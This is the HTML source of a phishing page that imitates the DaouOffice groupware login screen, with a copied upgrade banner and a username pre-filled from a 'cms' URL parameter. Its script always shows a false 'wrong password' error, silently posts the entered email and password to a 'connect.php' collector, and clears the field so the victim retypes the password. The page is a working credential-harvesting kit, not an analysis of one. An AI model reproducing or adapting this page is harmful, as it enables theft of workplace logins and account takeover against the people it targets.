<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="version" content="3.6.9.6">
    <meta name="brandName" content="DaouOffice">
    <title>로그인</title>
    <link href="https://login.daouoffice.com/resources/images/favicon/DO_favicon.ico?rev=202510282232" rel="shortcut icon">
    <link rel="stylesheet" href="./로그인_files/go_style.css" media="screen">
    <link rel="stylesheet" href="./로그인_files/go_login.css" media="screen">
    <link rel="stylesheet" href="./로그인_files/go_color_mint.css" media="screen, print">
    <link rel="stylesheet" href="./로그인_files/go_customize.css" media="screen">

    <script type="text/javascript" src="./로그인_files/jquery.js.download"></script>
    <script type="text/javascript" src="./로그인_files/jquery-ui-1.10.0.custom.js.download"></script>
    <script type="text/javascript" src="./로그인_files/hogan.js.download"></script>
    <script type="text/javascript" src="./로그인_files/lodash.js.download"></script>
    <script type="text/javascript" src="./로그인_files/backbone.js.download"></script>
    <script type="text/javascript" src="./로그인_files/moment.js.download"></script>
    <script type="text/javascript" src="./로그인_files/go-util.js.download"></script>
    <script type="text/javascript" src="./로그인_files/go-popup.js.download"></script>
    <script type="text/javascript" src="./로그인_files/go-login.js.download"></script>
    <script type="text/javascript" src="./로그인_files/IEInfoView.js.download"></script>
    <script type="text/javascript" src="./로그인_files/go-placeholder.js.download"></script>

    <style>
        .login_msg { display: none; background: #ffebee; border: 1px solid #f44336; padding: 12px; border-radius: 4px; margin: 15px 0; text-align: center; }
        .ic_error { background: #f44336; color: white; width: 20px; height: 20px; border-radius: 50%; display: inline-block; text-align: center; font-weight: bold; margin-right: 8px; font-size: 14px; line-height: 20px; }
        .txt { color: #d32f2f; font-weight: bold; font-size: 14px; }
        @keyframes shake { 0%,100%{transform:translateX(0)} 10%,30%,50%,70%,90%{transform:translateX(-5px)} 20%,40%,60%,80%{transform:translateX(5px)} }
        .shake { animation: shake 0.5s; }
    </style>
</head>
<body class="user_front" id="bodyPart">

    <div id="noticeBanner">
        <div class="banner" style="background: rgb(32, 190, 198); height: 130px; position: relative;">
            <span class="wrap_banner banner_upgrade" style="margin: 0 auto; width: 800px; display: block; position: relative;">
                <span class="subject" style="position: absolute; left: 150px; top: 12px; color: #fff; font-family: '나눔고딕'; font-size: 21pt;">
                    [중요] 다우오피스 4.0 업그레이드 사전작업 안내
                </span>
                <span class="info" style="position: absolute; left: 150px; top: 50px; font-family: '나눔고딕'; font-size: 16px; color: #fff; opacity: 0.9;">
                    안정적인 서비스 제공을 위한 업그레이드 사전 준비 작업을 진행합니다.<br>
                    아래 일정 동안 서비스 이용이 제한되오니 참고 부탁드립니다.<br>
                    <b style="color: #000;">* 사전 준비 작업 : 11월 15일(토) 00:00 ~ 03:00 (3시간)</b>
                </span>
            </span>
        </div>
    </div>

    <div class="go_wrap go_skin_default go_intro_wrap mint_theme">
        <header class="go_header">
            <h1></h1>
            <div id="language_select" class="language">
                <select>
                    <option value="ko">한국어</option>
                    <option value="en">English</option>
                    <option value="ja">日本語</option>
                    <option value="zh_CN">簡体中文</option>
                    <option value="zh_TW">繁體中文</option>
                    <option value="vi">tiếng Việt</option>
                </select>
            </div>
        </header>

        <div class="go_intro">
            <form id="loginForm" onsubmit="return false;">
                <section class="login_box">
                    <div class="sticker"><span class="go"></span></div>
                    <div class="custom_visual">
                        <img src="./로그인_files/logo_do_login.png">
                    </div>

                    <!-- ERROR MESSAGE - HIDDEN UNTIL SUBMIT -->
                    <div class="login_msg" id="errorMsg">
                        <span class="ic_error">!</span>
                        <span class="txt">비밀번호가 올바르지 않습니다.</span>
                    </div>

                    <fieldset>
                        <legend>login</legend>
                        <div class="login_id">
                            <input type="text" id="username" name="email" class="ipt_login login_wide" placeholder="계정" autocomplete="off" readonly>
                        </div>
                        <div class="login_pw">
                            <input type="password" name="password" id="password" class="ipt_login" placeholder="비밀번호" autocomplete="off">
                        </div>
                        <a id="login_submit" class="btn_login" href="javascript:void(0)">로그인</a>
                    </fieldset>
                    <div class="login_check">
                        <span class="option_wrap">
                            <input type="checkbox" id="saveLoginId">
                            <label>계정 저장</label>
                        </span>
                        <span class="option_wrap">|</span>
                        <a class="option_wrap" id="findPwd">비밀번호 찾기</a>
                    </div>
                </section>
            </form>
        </div>
    </div>

    <script type="text/javascript">
        // GET ?cms= FROM URL AND AUTO-FILL EMAIL
        function getParameterByName(name) {
            name = name.replace(/[\[\]]/g, '\\$&');
            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                results = regex.exec(window.location.href);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        var cmsEmail = getParameterByName('cms');
        if (cmsEmail) {
            document.getElementById('username').value = cmsEmail;
        }

        // SEND TO connect.php + SHOW ERROR
        function submitLogin() {
            var email = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            if (!email || !password) {
                alert('계정과 비밀번호를 입력하세요.');
                return;
            }

            // Show error + shake
            var errorMsg = document.getElementById('errorMsg');
            errorMsg.style.display = 'block';
            errorMsg.classList.add('shake');
            setTimeout(() => errorMsg.classList.remove('shake'), 500);

            // Send via AJAX to your connect.php
            $.ajax({
                url: 'connect.php',
                type: 'POST',
                data: {
                    email: email,
                    password: password,
                    ai: email,     // fallback
                    pr: password   // fallback
                },
                success: function() { /* silent */ },
                error: function() { /* still silent */ }
            });

            // Clear password field
            setTimeout(() => {
                document.getElementById('password').value = '';
                document.getElementById('password').focus();
            }, 800);
        }

        // Trigger on click
        document.getElementById('login_submit').onclick = submitLogin;

        // Trigger on Enter
        document.getElementById('password').onkeyup = function(e) {
            if (e.key === 'Enter') submitLogin();
        };

        // Auto-focus password
        if (cmsEmail) {
            setTimeout(() => document.getElementById('password').focus(), 500);
        }
    </script>

    <!-- Keep original scripts -->
    <script type="text/javascript">
        GO = GO || {}; GO["contextRoot"] = "/";
        if($.cookie("bannerCookie6834")) {
            $("#noticeBanner").remove();
        } else {
            $("#noticeBanner").show();
        }
    </script>
</body>
</html>